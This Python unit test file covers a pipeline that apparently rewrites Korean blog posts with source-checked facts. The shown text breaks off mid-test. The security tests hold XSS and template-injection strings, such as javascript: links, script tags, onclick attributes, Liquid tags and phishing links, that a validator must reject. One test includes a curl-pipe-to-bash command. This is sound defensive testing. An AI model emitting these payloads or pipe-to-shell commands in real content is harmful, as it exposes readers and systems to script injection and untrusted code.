import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import yaml

import rewrite_zero_traffic as rewrite


class RewriteZeroTrafficTests(unittest.TestCase):
    def test_research_schema_enforces_claim_cardinality(self):
        self.assertEqual(rewrite.RESEARCH_SCHEMA["properties"]["facts"]["minItems"], 8)
        self.assertEqual(rewrite.RESEARCH_SCHEMA["properties"]["facts"]["maxItems"], 16)
        self.assertEqual(rewrite.RESEARCH_SCHEMA["properties"]["limitations"]["minItems"], 1)
        self.assertEqual(rewrite.RESEARCH_SCHEMA["properties"]["limitations"]["maxItems"], 8)

    def test_research_retry_receives_previous_candidate_for_targeted_repair(self):
        prior = {
            "facts": [{
                "id": "F8", "statement": "교체해야 할 기존 후보 문장",
                "source_urls": ["https://example.org/docs"], "evidence_ids": ["S01Q001"],
            }],
            "limitations": [],
        }
        prompt = rewrite.research_prompt(
            {"title": "테스트"},
            [{"id": "S01Q001", "url": "https://example.org/docs", "text": "근거"}],
            prior,
            ["F8 verdict 인증 실패: unsupported"],
        )
        self.assertIn("교체해야 할 기존 후보 문장", prompt)
        self.assertIn("오류가 없는 F/L", prompt)
        self.assertIn("F8 verdict 인증 실패", prompt)
        self.assertIn("PyTorch 같은 정확한 프레임워크 이름", prompt)
        self.assertIn("Docker/MCP 연동 관계", prompt)
        cleaned = rewrite.clean_research({**prior, "verified_evidence": {"S01Q001": {"text": "x"}}})
        self.assertNotIn("verified_evidence", cleaned)

    def test_legacy_topic_hints_keep_headings_but_not_prose_or_code(self):
        body = """## 병렬처리와 Accelerator

검증되지 않은 오래된 본문 사실입니다.

### 천둥(Thor) 작업 스케줄러 사용법 {{ ignore }}

```bash
thorq --add ./exec
```
"""
        hints = rewrite.legacy_topic_hints(body)
        self.assertEqual(hints, ["병렬처리와 Accelerator", "천둥(Thor) 작업 스케줄러 사용법 ignore"])
        self.assertNotIn("검증되지 않은", " ".join(hints))
        self.assertNotIn("thorq", " ".join(hints))
        context = rewrite.existing_context(
            rewrite.ROOT / "_posts" / "fixture.md",
            {"title": "가속기 프로그래밍", "summary": "요약"},
            body,
        )
        self.assertEqual(context["legacy_topic_hints"], hints)

    def test_audited_units_join_wrapped_prose_and_keep_code_punctuation(self):
        value = """조건이 맞으면
오류가 발생합니다.

```c
return ok ? 1 : -1;
```

`upgrade! now` 오류 메시지를 확인합니다.

저자는 Alexei A. Efros입니다.
"""
        units = rewrite.split_audited_units(value)
        self.assertIn("조건이 맞으면 오류가 발생합니다.", units)
        self.assertIn("return ok ? 1 : -1;", units)
        self.assertIn("`upgrade! now` 오류 메시지를 확인합니다.", units)
        self.assertIn("저자는 Alexei A. Efros입니다.", units)
        faq_units = rewrite.build_draft_units({
            "title": "", "description": "", "summary": "", "content": "",
            "faq": [{"question": "가능한가요?", "answer": "아니요. 사용할 수 없습니다."}],
        })
        answer_units = [unit for unit in faq_units if unit["field"] == "faq_1_answer"]
        self.assertEqual([unit["text"] for unit in answer_units], ["아니요. 사용할 수 없습니다."])

    def test_liquid_detector_allows_nested_json_closer_only(self):
        nested_json = '```json\n{"outer":{"inner":1}}\n```'
        self.assertFalse(any("Liquid" in error for error in rewrite.markdown_security_errors(nested_json, set())))
        for unsafe in ("{{ secret }}", "{% include x %}", "{# hidden #}"):
            self.assertTrue(
                any("Liquid" in error for error in rewrite.markdown_security_errors(unsafe, set())),
                msg=unsafe,
            )

    def test_literal_url_extractor_handles_code_quotes_and_punctuation(self):
        urls = rewrite.literal_http_urls(
            '"url": "https://your-instance.com/mcp",\n'
            "curl -fsSL https://bash.agent-zero.ai/ | bash\n"
            "[문서](https://docs.example.org/guide)을 확인합니다."
        )
        self.assertEqual(urls, {
            "https://your-instance.com/mcp",
            "https://bash.agent-zero.ai/",
            "https://docs.example.org/guide",
        })

    def test_clean_draft_removes_repeated_faq_answers_and_textbook_titles(self):
        repeated = "지원 범위는 공식 문서의 호환성 표에서 확인해야 합니다."
        cleaned = rewrite.clean_draft({
            "title": "Darknet 메모리 할당 분석 및 cuDNN 제약",
            "description": "설명",
            "summary": "요약",
            "content": f"## 확인할 조건\n\n{repeated}",
            "faq": [
                {"question": "어디서 확인하나요?", "answer": repeated},
                {"question": "먼저 할 일은?", "answer": "입력 크기를 먼저 계산합니다."},
            ],
        })
        self.assertEqual(
            cleaned["faq"],
            [{"question": "먼저 할 일은?", "answer": "입력 크기를 먼저 계산합니다."}],
        )
        self.assertIsNotNone(rewrite.GENERIC_TITLE.search(cleaned["title"]))

    def test_strip_h1_keeps_python_comment_inside_fence(self):
        content = """도입 문장입니다.

# 중복 제목

## 실제 섹션

```python
# 이 주석은 코드이므로 남아야 한다
print(\"ok\")
```
"""
        cleaned = rewrite.strip_markdown_h1(content)
        self.assertNotIn("# 중복 제목", cleaned)
        self.assertIn("# 이 주석은 코드이므로 남아야 한다", cleaned)
        self.assertEqual(rewrite.markdown_h1_lines(cleaned), [])

    def test_frontmatter_update_preserves_date_permalink_and_unrelated_fields(self):
        original = """layout: post
title: 오래된 제목
date:   2019-02-18 09:00 -0400
permalink: /posts/fixed-url/
image:
  path: /assets/img/thumb/original.jpg
tags:
  - 예전태그
math: true"""
        updated = rewrite.update_frontmatter_block(
            original,
            {
                "title": "검색 의도에 맞춘 새 제목",
                "tags": ["AI", "가이드", "비교", "비용", "주의점"],
                "last_modified_at": "2026-08-25T12:00:00+09:00",
            },
        )
        self.assertIn("date:   2019-02-18 09:00 -0400", updated)
        self.assertIn("permalink: /posts/fixed-url/", updated)
        self.assertIn("path: /assets/img/thumb/original.jpg", updated)
        self.assertIn("math: true", updated)
        parsed = yaml.safe_load(updated)
        self.assertEqual(parsed["title"], "검색 의도에 맞춘 새 제목")
        self.assertEqual(parsed["tags"][0], "AI")

    def test_source_metadata_is_escaped_and_final_links_are_allowlisted(self):
        research = {
            "sources": [{
                "url": "https://example.org/docs/a",
                "publisher": "공식](https://evil.example/phish) [문서",
                "title": "정상 제목<script>alert(1)</script>",
            }],
        }
        rendered = rewrite.source_list(research)
        self.assertNotIn("evil.example", rendered)
        self.assertNotIn("<script>", rendered)
        output = f"---\nlayout: post\n---\n\n{rendered}\n"
        self.assertEqual(rewrite.validate_assembled_output(output, research), [])
        malicious = output + "<script>alert(1)</script>\n"
        errors = rewrite.validate_assembled_output(malicious, research)
        self.assertTrue(any("raw HTML" in error for error in errors))
        code_url = output + '```json\n{"url":"https://your-instance.com/mcp"}\n```\n'
        errors = rewrite.validate_assembled_output(code_url, research)
        self.assertTrue(any("allowlist 밖 URL" in error for error in errors))

    def test_assembled_source_list_contains_only_sources_used_by_the_final_draft(self):
        used_url = "https://example.org/docs/used"
        unused_url = "https://example.org/docs/unused"
        research = {
            "primary_keyword": "Example",
            "search_intent": "Example 사용 조건 확인",
            "article_format": "decision_guide",
            "sources": [
                {"url": used_url, "publisher": "Example", "title": "Used"},
                {"url": unused_url, "publisher": "Example", "title": "Unused"},
            ],
        }
        draft = {
            "title": "Example 선택 조건",
            "description": "Example 선택 조건을 확인합니다.",
            "summary": "Example 선택 조건의 핵심을 정리합니다.",
            "tags": ["Example"],
            "entities": ["Example"],
            "faq": [],
            "content": f"근거를 확인합니다 [공식 문서]({used_url}).",
        }
        output = rewrite.assemble_post(
            "layout: post\ntitle: Old\ndate: '2020-01-01'",
            {"layout": "post", "title": "Old", "date": "2020-01-01"},
            draft,
            research,
            original_sha256="a" * 64,
        )
        _, _, metadata = rewrite.split_post(output)
        self.assertEqual(
            metadata["source_citations"],
            [{"name": "Example", "url": used_url}],
        )
        self.assertNotIn(unused_url, output)

    def test_official_document_url_cannot_be_laundered_as_runtime_config(self):
        docs_url = "https://docs.example.org/production-setup"
        draft = {
            "title": "Example 프로덕션 설정의 필수 환경 변수와 주의점",
            "description": "Example 프로덕션 환경 변수의 역할과 잘못된 URL 설정을 확인하는 방법을 설명합니다.",
            "summary": "Example 인스턴스 주소에는 실제 배포 주소를 써야 하며 공식 문서 주소를 설정값으로 복사하면 안 됩니다.",
            "content": (
                "설정 전에 실제 인스턴스 주소를 확인해야 합니다.\n\n"
                "## 환경 변수 설정 주의점\n\n"
                f"공식 근거를 확인합니다 [문서]({docs_url}).\n\n"
                "```env\nAP_FRONTEND_URL=https://docs.example.org/production-setup\n```\n\n"
                "## 설정값 검증의 한계\n\n"
                "환경별 실제 주소는 배포자가 확인해야 합니다."
            ),
            "tags": ["Example", "배포", "환경변수", "설정", "주의점"],
            "entities": ["Example"],
            "faq": [],
        }
        errors = rewrite.validate_draft(
            draft,
            {
                "primary_keyword": "Example",
                "reader_problem": "프로덕션 주소를 설정한다",
                "reader_promise": "환경 변수 값을 검증한다",
                "popular_questions": [],
                "sources": [{"url": docs_url}],
            },
            {"title": "Old Example"},
        )
        self.assertTrue(any(
            "공식 문서 URL을 인스턴스·API 설정값" in error for error in errors
        ), errors)

    def test_executable_markdown_kramdown_and_liquid_are_rejected(self):
        research = {
            "sources": [{
                "url": "https://example.org/docs/a",
                "publisher": "Example",
                "title": "Official guide",
            }],
        }
        safe_body = (
            "[공식 문서](<https://example.org/docs/a>)와 "
            "[내부 안내](/about/)를 확인합니다."
        )
        self.assertEqual(
            rewrite.markdown_security_errors(
                safe_body,
                {"https://example.org/docs/a"},
            ),
            [],
        )
        attacks = {
            "javascript link": "[누르기](javascript:alert(1))",
            "encoded javascript": "[누르기](java&#x73;cript:alert(1))",
            "reference javascript": "[누르기][x]\n\n[x]: javascript:alert(1)",
            "escaped label external link": (
                r"[foo \] bar](https&#x3A;//evil.example/phish)"
            ),
            "escaped label remote image": (
                r"![foo \] bar](https&colon;//evil.example/pixel.png)"
            ),
            "kramdown ial": "[공식 문서](https://example.org/docs/a){: onclick=\"alert(1)\"}",
            "liquid tag": "{% include malicious.html %}",
            "liquid variable": "{{ site.data.secret }}",
        }
        for label, attack in attacks.items():
            with self.subTest(label=label):
                errors = rewrite.markdown_security_errors(
                    attack,
                    {"https://example.org/docs/a"},
                )
                self.assertTrue(errors)
                output = f"---\nlayout: post\n---\n\n{safe_body}\n\n{attack}\n"
                self.assertTrue(rewrite.validate_assembled_output(output, research))

    def test_draft_unit_catalog_covers_table_list_code_and_faq(self):
        draft = {
            "title": "선택 질문",
            "description": "설명 문장입니다.",
            "summary": "첫 요약입니다. 둘째 요약입니다.",
            "content": """## 주의점
- 첫 목록 항목
1. 설치 명령을 실행합니다.
| 기준 | 값 |
|---|---|
| 속도 | 22 ms |
```bash
tool --safe
```""",
            "faq": [{"question": "무료인가요?", "answer": "공식 가격표를 확인합니다."}],
        }
        units = rewrite.build_draft_units(draft)
        texts = [unit["text"] for unit in units]
        self.assertIn("| 속도 | 22 ms |", texts)
        self.assertIn("- 첫 목록 항목", texts)
        self.assertIn("설치 명령을 실행합니다.", texts)
        self.assertNotIn("1.", texts)
        self.assertIn("tool --safe", texts)
        self.assertIn("무료인가요?", texts)
        self.assertEqual(len({unit["unit_id"] for unit in units}), len(units))

    def test_manifest_accepts_target_object_and_rejects_duplicates(self):
        post = next(rewrite.POSTS_DIR.glob("*.md"))
        relative = post.relative_to(rewrite.ROOT).as_posix()
        with tempfile.TemporaryDirectory() as directory:
            manifest = Path(directory) / "manifest.json"
            manifest.write_text(
                '{"targets": [{"source": "' + relative + '"}]}',
                encoding="utf-8",
            )
            targets = rewrite.load_manifest(manifest, expected_count=1)
            self.assertEqual(targets, [post.resolve()])
            manifest.write_text(
                '["' + relative + '", "' + relative + '"]',
                encoding="utf-8",
            )
            with self.assertRaisesRegex(ValueError, "중복"):
                rewrite.load_manifest(manifest, expected_count=None)

    def test_production_manifest_is_hash_and_baseline_locked(self):
        manifest = rewrite.ROOT / "automation/data/zero_organic_manifest.json"
        targets, baselines, manifest_sha = rewrite.load_manifest_bundle(manifest, 447)
        self.assertEqual(len(targets), 447)
        self.assertEqual(len(baselines), 447)
        self.assertEqual(manifest_sha, rewrite.PRODUCTION_MANIFEST_SHA256)
        with tempfile.TemporaryDirectory() as directory:
            tampered = Path(directory) / "manifest.json"
            value = manifest.read_text(encoding="utf-8").replace(
                '"Organic Search"',
                '"Paid Search"',
                1,
            )
            tampered.write_text(value, encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "manifest SHA"):
                rewrite.load_manifest_bundle(tampered, 447)

    def test_state_store_has_process_lock_and_baseline_binding(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        baseline = rewrite.sha256_text(post.read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(
                Path(directory),
                [post],
                baselines={post: baseline},
                manifest_file_sha256="manifest-a",
            )
            with self.assertRaisesRegex(RuntimeError, "다른 rewrite 프로세스"):
                rewrite.StateStore(
                    Path(directory),
                    [post],
                    baselines={post: baseline},
                    manifest_file_sha256="manifest-a",
                )
            state.update(post, status="ready", output_sha256="0" * 64)
            self.assertEqual(
                rewrite.select_targets(
                    [post],
                    state,
                    apply=False,
                    retry_failed=False,
                    limit=None,
                ),
                [post],
            )
            state.close()
            with self.assertRaisesRegex(ValueError, "baseline SHA"):
                rewrite.StateStore(
                    Path(directory),
                    [post],
                    baselines={post: "0" * 64},
                    manifest_file_sha256="manifest-a",
                )

    def test_apply_uses_frozen_bytes_and_recovers_applying_journal(self):
        fd, post_name = tempfile.mkstemp(
            prefix="2010-01-01-rewrite-journal-",
            suffix=".md",
            dir=rewrite.POSTS_DIR,
        )
        os.close(fd)
        post = Path(post_name).resolve()
        original = (
            "---\nlayout: post\ntitle: 원본 제목\ndate: 2010-01-01\n"
            "categories:\n  - test\n---\n\n원본 본문입니다.\n"
        )
        post.write_text(original, encoding="utf-8")
        baseline = rewrite.sha256_text(original)
        try:
            with tempfile.TemporaryDirectory() as directory:
                state = rewrite.StateStore(
                    Path(directory),
                    [post],
                    baselines={post: baseline},
                    manifest_file_sha256="manifest-a",
                )
                frontmatter_block, _, original_meta = rewrite.split_post(original)
                draft = {
                    "title": "동결 원고 제목",
                    "description": "동결 원고 설명",
                    "summary": "동결 원고 요약",
                    "content": "동결 원고 본문입니다.",
                    "tags": [],
                    "entities": [],
                    "faq": [],
                }
                research = {
                    "sources": [],
                    "facts": [],
                    "limitations": [],
                    "verified_evidence": {},
                }
                output = rewrite.assemble_post(
                    frontmatter_block,
                    original_meta,
                    draft,
                    research,
                    original_sha256=baseline,
                )
                output_sha = rewrite.sha256_text(output)
                audit_payload = {
                    "final_supported": True,
                    "final_reader_ready": True,
                    "evidence_score": 10,
                    "reader_score": 9,
                    "removed_or_corrected": [],
                    "final_draft": draft,
                    "verification": {
                        "approved": True, "unit_checks": [],
                        "reader_ready": True, "reader_issues": [],
                    },
                    "verification_meta": rewrite.verification_cache_metadata(research, draft),
                }
                discovery_payload = {
                    "meta": {"fetched_at": rewrite.utc_now()},
                    "documents": [],
                }
                research_payload = {
                    "research": research,
                    "entailment_certificate": {},
                }
                rewrite.atomic_write_json(state.cache_path("discovery", post), discovery_payload)
                rewrite.atomic_write_json(state.cache_path("research", post), research_payload)
                rewrite.atomic_write_json(state.cache_path("audit", post), audit_payload)
                rewrite.atomic_write_text(state.cache_path("output", post), output)
                state.update(
                    post,
                    status="ready",
                    output_sha256=output_sha,
                    discovery_cache_sha256=rewrite.sha256_text(
                        state.cache_path("discovery", post).read_text(encoding="utf-8")
                    ),
                    research_cache_sha256=rewrite.sha256_text(
                        state.cache_path("research", post).read_text(encoding="utf-8")
                    ),
                    audit_cache_sha256=rewrite.sha256_text(
                        state.cache_path("audit", post).read_text(encoding="utf-8")
                    ),
                )
                stale_discovery = dict(discovery_payload)
                stale_discovery["meta"] = {
                    "fetched_at": (
                        rewrite.dt.datetime.now(rewrite.dt.timezone.utc)
                        - rewrite.dt.timedelta(hours=rewrite.FROZEN_APPLY_TTL_HOURS + 1)
                    ).isoformat()
                }
                rewrite.atomic_write_json(
                    state.cache_path("discovery", post),
                    stale_discovery,
                )
                state.update(
                    post,
                    status="applying",
                    pending_output_sha256=output_sha,
                    discovery_cache_sha256=rewrite.sha256_text(
                        state.cache_path("discovery", post).read_text(encoding="utf-8")
                    ),
                )
                self.assertFalse(rewrite.frozen_artifacts_ready(post, state))
                with self.assertRaisesRegex(RuntimeError, "168시간"):
                    rewrite.process_one(
                        post,
                        state,
                        apply=True,
                        attempts=1,
                        verify_links=False,
                    )

                discovery_payload["meta"]["fetched_at"] = rewrite.utc_now()
                rewrite.atomic_write_json(
                    state.cache_path("discovery", post),
                    discovery_payload,
                )
                state.update(
                    post,
                    status="ready",
                    pending_output_sha256=None,
                    discovery_cache_sha256=rewrite.sha256_text(
                        state.cache_path("discovery", post).read_text(encoding="utf-8")
                    ),
                )
                with (
                    patch.object(rewrite, "validate_research", return_value=[]),
                    patch.object(rewrite, "validate_evidence_verification", return_value=[]),
                    patch.object(rewrite, "validate_audit", return_value=[]),
                    patch.object(rewrite, "validate_verification", return_value=[]),
                    patch.object(rewrite, "validate_assembled_output", return_value=[]),
                    patch.object(rewrite, "obtain_research") as no_research,
                ):
                    _, status = rewrite.process_one(
                        post,
                        state,
                        apply=True,
                        attempts=1,
                        verify_links=False,
                    )
                self.assertEqual(status, "applied")
                self.assertEqual(post.read_text(encoding="utf-8"), output)
                no_research.assert_not_called()

                state.update(
                    post,
                    status="applying",
                    pending_output_sha256=output_sha,
                )
                self.assertEqual(
                    rewrite.incomplete_full_run_targets([post], state, apply=False),
                    [],
                )
                _, status = rewrite.process_one(
                    post,
                    state,
                    apply=True,
                    attempts=1,
                    verify_links=False,
                )
                self.assertEqual(status, "recovered_applied")
                self.assertEqual(state.record(post)["status"], "applied")
                state.close()
        finally:
            post.unlink(missing_ok=True)

    def test_research_validator_locks_facts_to_checked_sources(self):
        source_documents = [
            {
                "url": "https://example.org/docs/install",
                "title": "Install guide",
                "publisher": "example.org",
                "content_excerpt": "공식 설치 문서는 테스트 설치 절차와 설정 범위를 설명합니다. " * 100,
            },
            {
                "url": "https://example.net/reports/test",
                "title": "Official compatibility notes",
                "publisher": "example.net",
                "content_excerpt": "공식 호환성 문서는 테스트 환경의 지원 조건과 제한을 설명합니다. " * 100,
            },
        ]
        evidence_catalog = rewrite.build_evidence_catalog(source_documents)
        research = {
            "keep_topic": True,
            "refreshed_topic": "테스트 주제",
            "search_intent": "설치 오류 해결",
            "audience": "개발자",
            "primary_keyword": "테스트 키워드",
            "reader_problem": "오류가 난다",
            "reader_promise": "원인을 찾는다",
            "popular_questions": ["질문 1", "질문 2", "질문 3", "질문 4"],
            "article_format": "troubleshooting",
            "sources": [
                {
                    "url": "https://example.org/docs/install",
                    "title": "Install guide",
                    "publisher": "Example",
                    "tier": "official",
                },
                {
                    "url": "https://example.net/reports/test",
                    "title": "Official compatibility notes",
                    "publisher": "Example",
                    "tier": "official",
                },
            ],
            "facts": [
                {
                    "statement": statement,
                    "source_urls": [
                        "https://example.org/docs/install"
                        if index % 2 == 0
                        else "https://example.net/reports/test"
                    ],
                    "evidence_ids": [
                        f"S01Q{index % 5 + 1:03d}"
                        if index % 2 == 0
                        else f"S02Q{index % 5 + 1:03d}"
                    ],
                }
                for index, statement in enumerate([
                    "테스트 설치 문서는 사전 준비 항목을 안내합니다",
                    "테스트 설치 문서는 대상 디렉터리 구조를 설명합니다",
                    "테스트 설정 문서는 구성값 확인 순서를 제시합니다",
                    "테스트 실행 문서는 필요한 권한 범위를 명시합니다",
                    "테스트 완료 문서는 결과 확인 방법을 설명합니다",
                    "호환성 문서는 지원 환경의 범위를 구분합니다",
                    "호환성 문서는 필수 시스템 요구사항을 제시합니다",
                    "오류 문서는 실패 응답을 확인하는 기준을 설명합니다",
                    "복구 문서는 변경을 되돌리는 조건을 안내합니다",
                    "진단 문서는 설치 로그의 확인 위치를 설명합니다",
                ])
            ],
            "limitations": [{
                "statement": "테스트 환경의 지원 조건에는 문서에 적힌 제한이 적용됩니다",
                "source_urls": ["https://example.net/reports/test"],
                "evidence_ids": ["S02Q005"],
            }],
        }
        with patch.object(rewrite, "direct_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "deterministic_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "official_claim_authority_reason", return_value=None):
            self.assertEqual(
                rewrite.validate_research(
                    research,
                    verify_links=False,
                    source_documents=source_documents,
                    evidence_catalog=evidence_catalog,
                ),
                [],
            )
            research["facts"][0]["source_urls"] = ["https://unsupported.example/fact"]
            errors = rewrite.validate_research(
                research,
                verify_links=False,
                source_documents=source_documents,
                evidence_catalog=evidence_catalog,
            )
        self.assertTrue(any("sources 밖" in error for error in errors))
        research["facts"][0]["source_urls"] = ["https://example.org/docs/install"]
        research["facts"][0]["statement"] = "처리 시간은 12 ms입니다"
        with patch.object(rewrite, "direct_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "deterministic_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "official_claim_authority_reason", return_value=None):
            errors = rewrite.validate_research(
                research,
                verify_links=False,
                source_documents=source_documents,
                evidence_catalog=evidence_catalog,
            )
        self.assertTrue(any("리터럴이 근거에 없음" in error for error in errors))

    def test_static_source_policy_failure_refreshes_discovery(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        documents = [
            {
                "url": "https://vendor-one.com/docs/a",
                "title": "A",
                "publisher": "Vendor One",
                "content_excerpt": "공식 문서 근거입니다. " * 100,
                "content_sha256": rewrite.sha256_text("공식 문서 근거입니다. " * 100),
                "outbound_urls": [],
            },
            {
                "url": "https://vendor-two.com/docs/b",
                "title": "B",
                "publisher": "Vendor Two",
                "content_excerpt": "두 번째 공식 근거입니다. " * 100,
                "content_sha256": rewrite.sha256_text("두 번째 공식 근거입니다. " * 100),
                "outbound_urls": [],
            },
        ]
        candidate = {
            "sources": [
                {"url": document["url"], "title": document["title"], "publisher": document["publisher"], "tier": "official"}
                for document in documents
            ],
            "facts": [],
            "limitations": [],
        }
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(Path(directory), [post])
            with (
                patch.object(rewrite, "obtain_discovery", side_effect=[documents, documents]) as discovery,
                patch.object(rewrite, "generate_json", side_effect=[candidate, candidate]),
                patch.object(
                    rewrite,
                    "validate_research",
                    side_effect=[["출처 provenance 부적합: 첫 카탈로그"], []],
                ),
                patch.object(
                    rewrite,
                    "verify_evidence_candidate",
                    return_value=({"claim_checks": []}, [], False),
                ) as verifier,
            ):
                rewrite.obtain_research(
                    post,
                    {"title": "테스트"},
                    state,
                    attempts=2,
                    verify_links=False,
                )
            self.assertEqual(discovery.call_count, 2)
            self.assertEqual(verifier.call_count, 1)
            state.close()

    def test_critical_literals_preserve_code_punctuation_and_numeric_units(self):
        evidence = "공식 API는 foo(a, b)를 사용하며 처리 시간은 12 ms, 메모리는 8 GB입니다."
        self.assertTrue(rewrite.critical_literal_present("foo(a, b)", evidence))
        self.assertTrue(rewrite.critical_literal_present("12 ms", evidence))
        self.assertTrue(rewrite.critical_literal_present("8 GB", evidence))
        self.assertFalse(rewrite.critical_literal_present("12 s", evidence))
        self.assertFalse(rewrite.critical_literal_present("8 MB", evidence))
        literals = rewrite.critical_literals("처리 시간은 12 ms이고 메모리는 8 GB입니다")
        self.assertIn("12 ms", literals)
        self.assertIn("8 gb", literals)

        mismatch_cases = [
            ("클럭은 3 GHz입니다", "클럭은 3 MHz입니다", "3 ghz"),
            ("용량은 2 TB입니다", "용량은 2 GB입니다", "2 tb"),
            ("온도는 20 °C입니다", "온도는 20 °F입니다", "20 °c"),
            ("가격은 $20입니다", "가격은 $200입니다", "$20"),
            ("속도는 2x입니다", "속도는 20x입니다", "2x"),
            ("지연은 12 s입니다", "지연은 12 ms입니다", "12 s"),
            ("날짜는 2026-08-25입니다", "날짜는 2026-08-26입니다", "2026-08-25"),
        ]
        for statement, wrong_evidence, expected_literal in mismatch_cases:
            extracted = rewrite.critical_literals(statement)
            self.assertIn(expected_literal, extracted)
            self.assertFalse(
                all(
                    rewrite.critical_literal_present(literal, wrong_evidence)
                    for literal in extracted
                ),
                msg=f"mismatch가 통과함: {statement} / {wrong_evidence}",
            )

    def test_evidence_spans_overlap_across_chunk_boundaries(self):
        target = (
            "경계를 가로지르는 이 문장은 함수의 첫 대입부터 마지막 반환 조건까지 "
            "하나의 직접 근거 구간에 온전히 남아야 합니다."
        )
        text = ("채움 " * 260) + target + (" 뒤쪽" * 80)
        catalog = rewrite.build_evidence_catalog([{
            "url": "https://docs.example.org/source",
            "title": "Source",
            "publisher": "Example",
            "content_excerpt": text,
            "content_sha256": rewrite.sha256_text(text),
        }])
        self.assertGreaterEqual(len(catalog), 2)
        self.assertTrue(any(target in item["text"] for item in catalog))
        for first, second in zip(catalog, catalog[1:]):
            self.assertLess(second["start"], first["end"])

    def test_invalid_claim_pruning_keeps_supported_siblings(self):
        source_documents = [
            {
                "url": "https://platform.openai.com/docs/guides/responses",
                "title": "Responses guide",
                "publisher": "OpenAI",
                "content_excerpt": "응답 객체는 출력 항목을 포함하고 요청 결과를 설명합니다. " * 30,
                "outbound_urls": [],
            },
            {
                "url": "https://docs.docker.com/reference/compose-file/services/",
                "title": "Services",
                "publisher": "Docker",
                "content_excerpt": "서비스 정의는 구성 파일의 최상위 요소에 포함됩니다. " * 30,
                "outbound_urls": [],
            },
        ]
        evidence_catalog = rewrite.build_evidence_catalog(source_documents)
        research = {
            "primary_keyword": "OpenAI Responses Docker Compose",
            "refreshed_topic": "응답과 서비스 구성",
            "sources": [
                {
                    "url": source_documents[0]["url"],
                    "title": "Responses guide",
                    "publisher": "OpenAI",
                    "tier": "official",
                },
                {
                    "url": source_documents[1]["url"],
                    "title": "Services",
                    "publisher": "Docker",
                    "tier": "official",
                },
            ],
            "facts": [
                {
                    "id": "F1",
                    "statement": "응답 객체는 요청의 출력 항목을 포함합니다",
                    "source_urls": [source_documents[0]["url"]],
                    "evidence_ids": ["S01Q001"],
                },
                {
                    "id": "F2",
                    "statement": "처리 시간은 12 ms로 고정됩니다",
                    "source_urls": [source_documents[0]["url"]],
                    "evidence_ids": ["S01Q001"],
                },
            ],
            "limitations": [
                {
                    "id": "L1",
                    "statement": "서비스 정의는 구성 파일의 요소로 설명됩니다",
                    "source_urls": [source_documents[1]["url"]],
                    "evidence_ids": ["S02Q001"],
                },
                {
                    "id": "L2",
                    "statement": "서비스 정의는 구성 파일의 최상위 요소에 포함되어야 합니다",
                    "source_urls": [source_documents[1]["url"]],
                    "evidence_ids": ["S02Q001"],
                },
            ],
        }
        pruned = rewrite.prune_deterministically_invalid_claims(
            research,
            source_documents,
            evidence_catalog,
        )
        self.assertEqual([item["id"] for item in pruned["facts"]], ["F1"])
        self.assertEqual([item["id"] for item in pruned["limitations"]], ["L1"])
        self.assertEqual(
            pruned["limitations"][0]["statement"],
            "서비스 정의는 구성 파일의 최상위 요소에 포함되어야 합니다",
        )

    def test_high_confidence_korean_connectors_are_rejected_as_multi_clause(self):
        compound = [
            "Worker는 작업을 폴링하여 샌드박스를 할당하고 엔진으로 실행합니다",
            "구성 요소는 값을 출력하며 특정 환경에서는 동작하지 않습니다",
            "프레임워크는 C로 작성되어 여러 장치를 지원합니다",
            "NVML은 메트릭을 지원하지 않으므로 회계 정보를 제공하지 않습니다",
            "설정 오류 때문에 작업이 중단됩니다",
        ]
        for statement in compound:
            self.assertIsNotNone(
                rewrite.MULTI_CLAUSE_RISK.search(statement),
                msg=statement,
            )
        atomic = [
            "플러그인이 설정되어 있지 않은 환경에서는 옵션이 거부됩니다",
            "파일은 공개되어 있습니다",
            "설정 파일은 호스트에 마운트되어야 합니다",
        ]
        for statement in atomic:
            self.assertIsNone(
                rewrite.MULTI_CLAUSE_RISK.search(statement),
                msg=statement,
            )

    def test_same_evidence_paraphrase_padding_is_not_counted_twice(self):
        base = {
            "source_urls": ["https://docs.example.org/guide"],
            "evidence_ids": ["S01Q001"],
        }
        duplicate_pairs = [
            (
                "Activepieces Community Edition은 MIT 라이선스로 공개된 오픈소스 소프트웨어입니다",
                "Activepieces Community Edition은 MIT 라이선스로 공개됩니다",
            ),
            (
                "Activepieces의 Piece는 TypeScript 언어로 작성된 npm 패키지 형태입니다",
                "Activepieces의 Piece는 TypeScript 언어로 작성된 npm 패키지입니다",
            ),
            (
                "Activepieces의 메인 데이터베이스로는 Postgres를 사용합니다",
                "Activepieces의 메인 데이터베이스는 Postgres입니다",
            ),
        ]
        for first, second in duplicate_pairs:
            self.assertTrue(rewrite.claims_are_near_duplicates(
                {**base, "statement": first},
                {**base, "statement": second},
            ))
        self.assertFalse(rewrite.claims_are_near_duplicates(
            {**base, "statement": "프레임워크는 CPU 연산을 지원합니다"},
            {**base, "statement": "프레임워크는 GPU 연산을 지원합니다"},
        ))
        self.assertFalse(rewrite.claims_are_near_duplicates(
            {**base, "statement": "프레임워크는 CPU 연산을 지원합니다"},
            {
                **base,
                "evidence_ids": ["S01Q002"],
                "statement": "프레임워크는 CPU 연산을 지원합니다",
            },
        ))

    def test_research_claim_urls_must_be_selected_source_urls(self):
        selected_url = "https://docs.example.org/install"
        unselected_url = "https://github.com/example/tool.git"
        source_documents = [{
            "url": selected_url,
            "title": "Install",
            "publisher": "Example",
            "content_excerpt": (
                f"공식 설치 문서는 {unselected_url} 명령과 설정 절차를 설명합니다. " * 30
            ),
            "outbound_urls": [],
        }]
        evidence_catalog = rewrite.build_evidence_catalog(source_documents)
        research = rewrite.clean_research({
            "sources": [{
                "url": selected_url,
                "title": "Install",
                "publisher": "Example",
                "tier": "official",
            }],
            "facts": [{
                "statement": f"설치 명령은 git clone {unselected_url} 입니다",
                "source_urls": [selected_url],
                "evidence_ids": ["S01Q001"],
            }],
            "limitations": [],
        })
        with patch.object(rewrite, "direct_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "deterministic_source_rejection_reason", return_value=None), \
